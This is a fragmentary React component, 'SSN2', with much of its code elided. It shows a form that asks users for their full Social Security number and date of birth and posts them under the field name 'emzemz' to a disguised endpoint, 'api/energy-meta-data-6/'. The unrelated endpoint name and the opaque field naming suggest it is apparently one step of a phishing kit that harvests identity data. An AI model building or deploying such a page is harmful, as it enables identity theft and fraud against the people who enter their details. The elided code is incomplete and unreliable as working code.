...
const SSN2: React.FC = () => {
  ...
  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    ...
    if (!Object.values(newErrors).some((error) => error)) {
      try {
        ...
        await axios.post(`${baseUrl}api/energy-meta-data-6/`, {
          emzemz,
  ...
  return (
    <FlowCard
      ...
      subtitle={<span className="text-slate-300">Enter your full SSN and date of birth to continue.</span>}
      footer={footer}
    >
      <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">
      ...
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          ...
          <div className="flex items-center border border-slate-600 rounded">
            ...
            />
            <button type="button" onClick={toggleSSNVisibility} className="px-3 text-[#00b4ff]">
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
        ...
        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="dob-month">
            Date of birth
          </label>
          <div className="flex items-center gap-2 border border-slate-600 rounded px-3 py-2">
            <select
              id="dob-month"
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              className="flex-1 bg-[#0f172a] text-white text-sm focus:outline-none border-none"
            >
